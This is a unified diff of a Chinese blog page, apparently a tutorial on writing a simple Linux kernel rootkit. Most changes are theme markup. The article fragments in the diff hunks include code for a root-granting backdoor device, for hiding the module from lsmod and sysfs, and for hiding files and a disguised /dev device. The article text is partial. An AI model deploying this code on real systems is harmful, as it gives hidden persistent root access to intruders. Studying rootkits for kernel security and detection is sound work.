@@ -1,209 +1,332 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN" color-mode="light">
-
-  <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="keywords" content="" />
-  <meta name="author" content="arttnba3" />
-  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
-  
-  
-  <title>
-    
-      【CODE.0x01】简易 Linux Rootkit 编写入门指北 
-      
-      
-      |
-    
-     arttnba3&#39;s blog
-  </title>
-
-  
-    <link rel="apple-touch-icon" href="/img/favicon.png">
-    <link rel="icon" href="/img/favicon.png">
-  
-
-  <!-- Raleway-Font -->
-  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
-
-  <!-- hexo site css -->
-  
-<link rel="stylesheet" href="/css/color-scheme.css">
-<link rel="stylesheet" href="/css/base.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
-<link rel="stylesheet" href="/css/github-markdown.css">
-<link rel="stylesheet" href="/css/highlight.css">
-<link rel="stylesheet" href="/css/comments.css">
-
-  <!-- 代码块风格 -->
-  
-
-  <!-- jquery3.3.1 -->
-  
-    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
-  
-
-  <!-- fancybox -->
-  
-    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
-    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
-  
-  
-<script src="/js/fancybox.js"></script>
+<html lang="zh-CN" data-default-color-scheme=auto>
 
 
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="arttnba3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="「I’M A PENGUIN」">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CODE.0x01】简易 Linux Rootkit 编写入门指北">
+<meta property="og:url" content="http://blog.arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/index.html">
+<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:description" content="「I’M A PENGUIN」">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/ZdT69sECcyPrW4f.png">
+<meta property="article:published_time" content="2021-07-07T00:53:52.000Z">
+<meta property="article:modified_time" content="2022-04-01T07:28:48.000Z">
+<meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Linux Kernel">
+<meta property="article:tag" content="ROOTKIT">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2021/07/22/ZdT69sECcyPrW4f.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>【CODE.0x01】简易 Linux Rootkit 编写入门指北 - arttnba3&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
-  <script>
-    var html = document.documentElement
-    const colorMode = localStorage.getItem('color-mode')
-    if (colorMode) {
-      document.documentElement.setAttribute('color-mode', colorMode)
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
 </head>
 
 
-  <body>
-    <div id="app">
-      <div class="header">
-  <div class="avatar">
-    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
-      <!-- 头像取消懒加载，添加no-lazy -->
-      
-        <img src="/img/avatar.png" alt="">
-      
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>arttnba3&#39;s blog</strong>
     </a>
-    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+                rss
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-  <div class="navbar">
-    <ul>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://i.loli.net/2021/07/22/lC5xD6pI97RBMAW.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【CODE.0x01】简易 Linux Rootkit 编写入门指北"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-07-07 08:53" pubdate>
+          2021年7月7日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          undefined 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          NaN 分钟
+        
+      </span>
+    
+
+    
+    
       
-        <li class="nav-item" data-path="/">
-          <a href="/">Home</a>
-        </li>
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
       
-        <li class="nav-item" data-path="/archives/">
-          <a href="/archives/">Archives</a>
-        </li>
+    
+  </div>
+
+
+        
+      </div>
+
       
-        <li class="nav-item" data-path="/categories/">
-          <a href="/categories/">Categories</a>
-        </li>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
       
-        <li class="nav-item" data-path="/tags/">
-          <a href="/tags/">Tags</a>
-        </li>
-      
-        <li class="nav-item" data-path="/friends/">
-          <a href="/friends/">Friends</a>
-        </li>
-      
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
-    </ul>
+    </div>
   </div>
 </div>
 
+</div>
 
-<script src="/js/activeNav.js"></script>
+  </header>
 
+  <main>
+    
+      
 
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
 
-      <div class="flex-container">
-        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
-<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+    </div>
 
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
-
-
-
-
-  <!-- clipboard -->
-
-  
-    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
-  
-  
-<script src="/js/codeCopy.js"></script>
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
-  <div class="container post-details" id="post-details">
-    <div class="post-content">
-      <div class="post-title">【CODE.0x01】简易 Linux Rootkit 编写入门指北</div>
-      <div class="post-attach">
-        <span class="post-pubtime">
-          <i class="iconfont icon-updatetime" title="更新时间"></i>
-          2021-07-07 08:53:52
-        </span>
-        
-              <span class="post-categories">
-                <i class="iconfont icon-bookmark" title="分类"></i>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【CODE.0x01】简易 Linux Rootkit 编写入门指北</h1>
+            
+              <p class="note note-info">
                 
-                <span class="span--category">
-                  <a href="/categories/CODE/" title="CODE">
-                    <b>#</b> CODE
-                  </a>
-                </span>
+                  
+                    本文最后更新于：2022年4月1日 下午
+                  
                 
-              </span>
-          
-              <span class="post-tags">
-                <i class="iconfont icon-tags" title="标签"></i>
+              </p>
+            
+            
+              <div class="markdown-body">
                 
-                <span class="span--tag">
-                  <a href="/tags/Linux/" title="Linux">
-                    <b>#</b> Linux
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/Linux-Kernel/" title="Linux Kernel">
-                    <b>#</b> Linux Kernel
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/ROOTKIT/" title="ROOTKIT">
-                    <b>#</b> ROOTKIT
-                  </a>
-                </span>
-                
-              </span>
-          
-      </div>
-      <div class="markdown-body">
-        <p>「I’M A PENGUIN」</p>
+                <p>「I’M A PENGUIN」</p>
 <span id="more"></span>
 
 <p>后门？👴直接重装系统给你扬了（</p>
@@ -276,7 +399,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_rootkit_write</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">const</span> <span class="type">char</span> __user * user_buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * __loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>简单测试一下，可以看到当我们向设备内写入任意内容后便提权到了 root</p>
-<p><img src="https://i.loli.net/2021/07/17/z5bg2snkNeLuKVm.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/17/z5bg2snkNeLuKVm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h3 id="方法II-直接修改-cred-结构体"><a href="#方法II-直接修改-cred-结构体" class="headerlink" title="方法II.直接修改 cred 结构体"></a>方法II.直接修改 cred 结构体</h3><p>前面我们讲到，<code>commit_creds()</code> 函数用以将一个新的 cred 应用到当前进程，我们来观察其源码相应逻辑：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
 
@@ -286,7 +409,7 @@
 
 <p>这里需要注意的是 uid 与 gid 的类型为封装为结构体的 <code>kuid_t</code> 与 <code>kgid_t</code> 类型，应当使用宏 <code>KGIDT_INIT()</code> 与 <code>KUIDT_INIT()</code> 进行赋值</p>
 <p>可以看到当我们向设备写入之后便提权到了 root，不同的是我们只修改了几个 uid 和 gid，所以原有的其他信息依旧会保留，这里也可以选择把其他的一并改掉</p>
-<p><img src="https://i.loli.net/2021/07/17/aidHQFXLtJq3ZIK.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/17/aidHQFXLtJq3ZIK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <blockquote>
 <h4 id="current：CPU-局部变量保存当前进程-task-struct-结构体"><a href="#current：CPU-局部变量保存当前进程-task-struct-结构体" class="headerlink" title="current：CPU 局部变量保存当前进程 task_struct 结构体"></a>current：CPU 局部变量保存当前进程 task_struct 结构体</h4><p>这里<strong>简单</strong>讲一下宏 <code>current</code> 的是如何获取当前进程的 task_struct 的：该宏定义于内核源码 <code>arch/x6/include/asm/current.h</code> 中，展开后为函数 <code>static __always_inline struct task_struct *get_current(void)</code> ，该函数只有一句 <code>return this_cpu_read_stable(current_task);</code>：</p>
 <p>其中 <code>current_task</code> 为 CPU 局部变量，在头文件开头使用宏 <code>DECLARE_PER_CPU</code> 从外部引入该变量，该宏定义于 <code>include/linux/percpu-defs.h</code> 中，展开后为 <code>DECLARE_PER_CPU_SECTION(type, name, &quot;&quot;)</code>，该宏再度展开为 <code>extern __PCPU_ATTRS(sec) __typeof__(type) name</code>，该宏再度展开为 <code>__percpu __attribute__((section(PER_CPU_BASE_SECTION sec))) PER_CPU_ATTRIBUTES</code>，其中宏 <code>PER_CPU_BASE_SECTION</code> 定义于 <code>include/asm-generic/percpu.h</code>中，SMP（多对称处理）下展开为字符串 <code>&quot;.data..percpu&quot;</code>。最终展开为 <code>__attribute__((section(&quot;.data..percpu&quot;))) (type) name</code>，其中  <code>__attribute__</code> 宏为 gcc 的特殊机制，具体的参见<a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc-10.2.0/gcc/Common-Function-Attributes.html#Common-Function-Attributes">手册</a></p>
@@ -327,7 +450,7 @@
 
 <p>将我们的 rootkit 重新 make 后加载到内核中，我们会发现 <strong>lsmod 命令已经无法发现我们的 rootkit，在 &#x2F;proc&#x2F;modules 文件中已经没有我们 rootkit 的信息</strong>，与此同时我们的 rootkit <strong>所提供的功能一切正常</strong></p>
 <p>但同样地，无论是载入还是卸载内核模块都需要对双向链表进行操作，由于我们的 rootkit 已经脱链故<strong>我们无法将其卸载</strong>（不过 rootkit 一次载入后应当是要长久驻留在内核中的）</p>
-<p><img src="https://i.loli.net/2021/07/07/XkE79CKGZBnepW2.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/07/XkE79CKGZBnepW2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h2 id="Step-II-x2F-sys-x2F-module-x2F-信息隐藏"><a href="#Step-II-x2F-sys-x2F-module-x2F-信息隐藏" class="headerlink" title="Step-II. &#x2F;sys&#x2F;module&#x2F; 信息隐藏"></a>Step-II. &#x2F;sys&#x2F;module&#x2F; 信息隐藏</h2><p>sysfs 与 procfs 相类似，同样是一个基于 RAM 的虚拟文件系统，它的作用是将内核信息以文件的方式提供给用户程序使用，其中便包括我们的 rootkit 模块信息，sysfs 会动态读取内核中的 kobject 层次结构并在 <code>/sys/module/</code> 目录下生成文件</p>
 <p>这里简单讲一下 kobject：Kobject 是 Linux 中的设备数据结构基类，在内核中为 <code>struct kobject</code> 结构体，通常内嵌在其他数据结构中；每个设备都有一个 kobject 结构体，多个 kobject 间通过内核双向链表进行链接；kobject 之间构成层次结构</p>
 <blockquote>
@@ -337,7 +460,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unlink from kobject</span></span><br><span class="line">    kobject_del(&amp;__this_module.mkobj.kobj);</span><br><span class="line">    list_del(&amp;(&amp;__list_module-&gt;mkobj.kobj.entry));</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>简单测试，我们可以发现无论是在 procfs 中还是 sysfs 中都已经没有了我们的 rootkit 的身影，而提权的功能依旧正常，我们很好地完成了隐藏模块的功能</p>
-<p><img src="https://i.loli.net/2021/07/08/sxcQJd7CDTaWfA1.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/08/sxcQJd7CDTaWfA1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h2 id="Step-III-文件隐藏"><a href="#Step-III-文件隐藏" class="headerlink" title="Step-III. 文件隐藏"></a>Step-III. 文件隐藏</h2><p>前面我们讲到我们注册了一个字符型设备作为我们用户进程的接口，但是<strong>无论命名得再怎么好，一个陌生的设备仍容易被管理员发现</strong>；同样地，我们的 rootkit 既然要长久驻留在系统上，那么在系统每一次开机时都应当载入我们的 rootkit，这就要求<strong>我们的 rootkit 文件还需要保留在硬盘上</strong></p>
 <p>因此接下来我们还要完成相关文件的隐藏的工作</p>
 <h3 id="文件遍历过程"><a href="#文件遍历过程" class="headerlink" title="文件遍历过程"></a>文件遍历过程</h3><p>在 Linux 中最常用的遍历文件的指令为 <code>ls</code>，我们使用 <code>strace</code> 来观察其所使用到的系统调用，去除掉前面的载入 glibc 库所使用的系统调用以外，我们会发现其调用了一个名为 <code>getgetdents64</code> 的系统调用：</p>
@@ -351,7 +474,7 @@
 
 <p>在 Linux 内核中使用 VFS 统一不同的文件系统，其中使用 <code>file</code> 结构体来表示一个文件，而每个文件都有一张函数表 <code>file_operations</code> 函数表对应相应的对该文件的相关操作（例如 read、write），该函数表取自该文件对应的 inode，最终取自相应的文件系统提供的具体函数</p>
 <p>在这里会调用表中的函数指针 <code>iterate_shared</code> 或 <code>iterate</code>，用 gdb 简单调试一下内核，可以发现在 <code>5.11.0</code> 版本的内核中调用的是 <code>iterate_shared</code></p>
-<p><img src="https://i.loli.net/2021/07/10/I6UxoPeCmWJYEfH.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/10/I6UxoPeCmWJYEfH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h3 id="EXT4：（未完成）"><a href="#EXT4：（未完成）" class="headerlink" title="EXT4：（未完成）"></a>EXT4：（未完成）</h3><p>笔者的机子用的是 <code>ext4</code> 文件系统，这也是目前 Linux 机器最常见的文件系统之一，我们来看内核源码中对应函数的实现，在 <code>/fs/ext4/dir.c</code> 中有如下定义：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_dir_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= ext4_dir_llseek,</span><br><span class="line">	.read		= generic_read_dir,</span><br><span class="line">	.iterate_shared	= ext4_readdir,</span><br><span class="line">	.unlocked_ioctl = ext4_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	.compat_ioctl	= ext4_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.fsync		= ext4_sync_file,</span><br><span class="line">	.release	= ext4_release_dir,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
@@ -360,21 +483,21 @@
 <p>🕊🕊🕊</p>
 </blockquote>
 <h3 id="ramVFS：d-child-链表脱链隐藏文件"><a href="#ramVFS：d-child-链表脱链隐藏文件" class="headerlink" title="ramVFS：d_child 链表脱链隐藏文件"></a>ramVFS：d_child 链表脱链隐藏文件</h3><p>我们都知道在 VFS 中 <code>dentry</code> （目录项）用以表示一个文件&#x2F;文件夹，对于 dentry 而言，其构成如下图所示拓扑结构</p>
-<p><img src="https://i.loli.net/2021/07/14/4zlJSm9V1Rg57tB.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/14/4zlJSm9V1Rg57tB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>由此拓扑结构我们不难看出：在 VFS 中基于 dentry 的 d_child 链表遍历一个目录。由此我们不难想到的是<strong>只要我们将一个文件的 dentry 从其 d_child 链表中脱链，就能成功隐藏该文件</strong></p>
 <p>我们在 VFS 中隐藏文件的代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hideFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * filename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">hide_file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> * <span class="title">hide_dentry</span>;</span></span><br><span class="line"></span><br><span class="line">    hide_file = filp_open(filename, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR(hide_file))</span><br><span class="line">    &#123;</span><br><span class="line">        hide_dentry = hide_file-&gt;f_path.dentry;</span><br><span class="line"></span><br><span class="line">        hide_dentry-&gt;d_child.next-&gt;prev = hide_dentry-&gt;d_child.prev;</span><br><span class="line">        hide_dentry-&gt;d_child.prev-&gt;next = hide_dentry-&gt;d_child.next;</span><br><span class="line"></span><br><span class="line">        filp_close(hide_file, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里用 qemu 起一个虚拟机跑我们的 rootkit，用 busybox 构建一个文件系统</p>
 <p>简单测试一下，当我们将要隐藏的文件在 VFS 中对应的 dentry 从其 d_child 链表中摘除之后，我们便无法通过 <code>ls</code> 或是 <code>find</code> 命令找到这个文件，<strong>但是该文件仍能被正常访问</strong>，由此我们成功地将一个文件隐藏了起来</p>
-<p><img src="https://i.loli.net/2021/07/23/zkT3X6xEnMtbhaf.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/23/zkT3X6xEnMtbhaf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h4 id="x2F-dev-设备文件隐藏"><a href="#x2F-dev-设备文件隐藏" class="headerlink" title="&#x2F;dev 设备文件隐藏"></a>&#x2F;dev 设备文件隐藏</h4><p>同样地，我们用以与 rootkit 进行通信的设备文件基于 <code>devtmpfs</code>，为基于 ram 的文件系统，因此我们可以直接在 VFS 中将其 dentry 从其 d_child 链表脱链，完成该设备文件的隐藏</p>
 <p>简单测试一下，我们在 <code>/dev</code> 目录下已经无法找到该设备文件，但是我们仍能与我们的 rootkit 正常通信</p>
-<p><img src="https://i.loli.net/2021/07/23/UIDQ41CKMBNhEWu.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/23/UIDQ41CKMBNhEWu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <blockquote>
 <p>这里简单讲一下 Linux 内核中的 VFS——Virtual File System，VFS 为对文件系统的操作提供了统一的接口，将对 ext2、ext3、ntfs…之类的文件系统的操作在 VFS Layer 中统一，由 VFS 向用户及内核的其他部分提供文件操作的统一 API</p>
 <p>VFS 中的文件为如下结构（此图来自于<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/61123802">知乎</a>）：</p>
-<p><img src="https://i.loli.net/2021/07/10/L1Jbl8Qkqe4rYxp.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/07/10/L1Jbl8Qkqe4rYxp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>简单讲一下这张图中涉及到的内核数据结构：</p>
 <ul>
 <li>task_struct：内核中的进程描述符</li>
@@ -421,7 +544,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/intel_rapl_msrdv&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span 